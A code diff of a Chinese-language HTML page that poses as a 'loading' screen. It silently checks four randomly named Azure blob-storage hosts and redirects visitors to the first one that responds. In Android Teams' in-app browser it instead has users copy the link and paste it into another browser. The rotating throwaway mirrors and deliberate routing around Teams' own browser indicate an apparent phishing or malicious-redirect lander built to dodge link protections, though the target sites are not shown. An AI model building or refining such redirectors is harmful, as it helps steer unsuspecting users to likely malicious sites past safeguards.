@@ -1,143 +1,151 @@
 <!doctype html>
 <html lang="zh-CN">
 <head>
-<meta charset="utf-8">
-<title>正在加载…</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-  body, html {
-    height: 100%;
-    margin: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: #f7f9fb;
-    font-family: Segoe UI, Roboto, Helvetica;
-    text-align: center;
-    padding: 0 20px;
-  }
-  #bar {
-    width: 60%;
-    height: 6px;
-    border-radius: 3px;
-    overflow: hidden;
-    background: #dde3ec;
-    box-shadow: 0 0 3px rgba(0,0,0,.08) inset;
-  }
-  #bar::after {
-    content: '';
-    display: block;
-    height: 100%;
-    width: 0;
-    background: #4f71ff;
-    animation: load 2s linear infinite;
-  }
-  @keyframes load {
-    0% {width: 0}
-    50% {width: 100%}
-    100% {width: 0}
-  }
-  #err {
-    display: none;
-    color: #666;
-  }
-  #err h1 {
-    font-size: 20px;
-    margin: 16px 0 8px;
-  }
-  #err p {
-    margin: 0 0 16px;
-  }
-  #err button {
-    padding: 8px 16px;
-    border: none;
-    border-radius: 4px;
-    background: #4f71ff;
-    color: #fff;
-    font-size: 14px;
-    cursor: pointer;
-  }
-  #alt {
-    display: none;
-    color: #666;
-  }
-  #alt h1 {
-    font-size: 20px;
-    margin: 16px 0 8px;
-  }
-  #alt a {
-    display: inline-block;
-    margin-top: 12px;
-    padding: 8px 16px;
-    background: #4f71ff;
-    color: #fff;
-    text-decoration: none;
-    border-radius: 4px;
-    font-size: 14px;
-  }
-</style>
+  <meta charset="utf-8">
+  <title>正在加载…</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f7f9fb;
+      font-family: Segoe UI, Roboto, Helvetica;
+      text-align: center;
+      padding: 0 20px;
+    }
+    #bar {
+      width: 60%;
+      height: 6px;
+      border-radius: 3px;
+      overflow: hidden;
+      background: #dde3ec;
+      box-shadow: 0 0 3px rgba(0,0,0,.08) inset;
+    }
+    #bar::after {
+      content: '';
+      display: block;
+      height: 100%;
+      width: 0;
+      background: #4f71ff;
+      animation: load 2s linear infinite;
+    }
+    @keyframes load {
+      0% {width: 0}
+      50% {width: 100%}
+      100% {width: 0}
+    }
+    #err, #alt {
+      display: none;
+      color: #666;
+    }
+    h1 {
+      font-size: 20px;
+      margin: 16px 0 8px;
+    }
+    p {
+      margin: 0 0 16px;
+    }
+    button, a.copy-btn {
+      padding: 8px 16px;
+      border: none;
+      border-radius: 4px;
+      background: #4f71ff;
+      color: #fff;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .copied {
+      margin-top: 12px;
+      color: green;
+    }
+  </style>
 </head>
 <body>
-<div id="bar"></div>
+  <div id="bar"></div>
 
-<div id="err">
-  <h1>哎呀，加载失败了…</h1>
-  <p>请检查网络或稍后重试</p>
-  <button onclick="retry()">重新尝试</button>
-</div>
+  <div id="err">
+    <h1>哎呀，加载失败了…</h1>
+    <p>请检查网络或稍后重试</p>
+    <button onclick="retry()">重新尝试</button>
+  </div>
 
-<div id="alt">
-  <h1>您的手机暂时不支持</h1>
-  <p>请到应用商店下载 EDGE 浏览器访问</p>
-  <a href="https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html" target="_blank">备用地址</a>
-</div>
+  <div id="alt">
+    <h1>当前环境不支持自动打开</h1>
+    <p>请点击下方按钮复制可访问的网址，并粘贴到浏览器中打开：</p>
+    <a id="copyLink" class="copy-btn">复制链接</a>
+    <div id="copied" class="copied" style="display:none;">已复制链接！</div>
+  </div>
 
-<script>
-(async function () {
-  const urls = [
-    "https://iwtq25dhr.blob.core.windows.net/home/index.html",
-    "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
-    "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
-    "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
-  ];
-  const isAndroid = /android/i.test(navigator.userAgent);
-  const isTeams = /Teams/i.test(navigator.userAgent);
-  const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+  <script>
+    (async function () {
+      const urls = [
+        "https://iwtq25dhr.blob.core.windows.net/home/index.html",
+        "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
+        "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
+        "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
+      ];
+      const isAndroid = /android/i.test(navigator.userAgent);
+      const isTeams = /Teams/i.test(navigator.userAgent);
 
-  // 安卓端 Teams 内部浏览器兼容问题提示
-  if (isAndroid && isTeams) {
-    showAlt();
-    return;
-  }
+      const TIMEOUT = 4000;
 
-  const TIMEOUT = 4000;
+      // 尝试每个地址并返回第一个有效的
+      async function checkUrls() {
+        for (const url of urls) {
+          try {
+            await fetch(url, { method: "HEAD", mode: "no-cors", cache: "no-store" });
+            return url;
+          } catch (e) { }
+        }
+        return null;
+      }
 
-  for (const u of urls) {
-    try {
-      await fetch(u, { method: "HEAD", mode: "no-cors", cache: "no-store" });
-      location.replace(u);
-      return;
-    } catch (e) {
-      // try next URL
+      const validUrl = await checkUrls();
+
+      if (isAndroid && isTeams) {
+        if (validUrl) {
+          showCopyLink(validUrl);
+        } else {
+          showError();
+        }
+      } else {
+        // 非 Teams 安卓，自动跳转第一个能打开的网址
+        if (validUrl) {
+          location.replace(validUrl);
+        } else {
+          showError();
+        }
+      }
+    })();
+
+    function showError() {
+      document.getElementById("bar").style.display = "none";
+      document.getElementById("err").style.display = "block";
     }
-  }
 
-  showError();
-})();
+    function showCopyLink(url) {
+      document.getElementById("bar").style.display = "none";
+      document.getElementById("alt").style.display = "block";
 
-function showError() {
-  document.getElementById("bar").style.display = "none";
-  document.getElementById("err").style.display = "block";
-}
+      const btn = document.getElementById("copyLink");
+      btn.addEventListener("click", async () => {
+        try {
+          await navigator.clipboard.writeText(url);
+          document.getElementById("copied").style.display = "block";
+        } catch (err) {
+          alert("复制失败，请手动复制：\n" + url);
+        }
+      });
+    }
 
-function showAlt() {
-  document.getElementById("bar").style.display = "none";
-  document.getElementById("alt").style.display = "block";
-}
-
-function retry() {
-  location.reload();
-}
-</script>
+    function retry() {
+      location.reload();
+    }
+  </script>
 </body>
 </html>
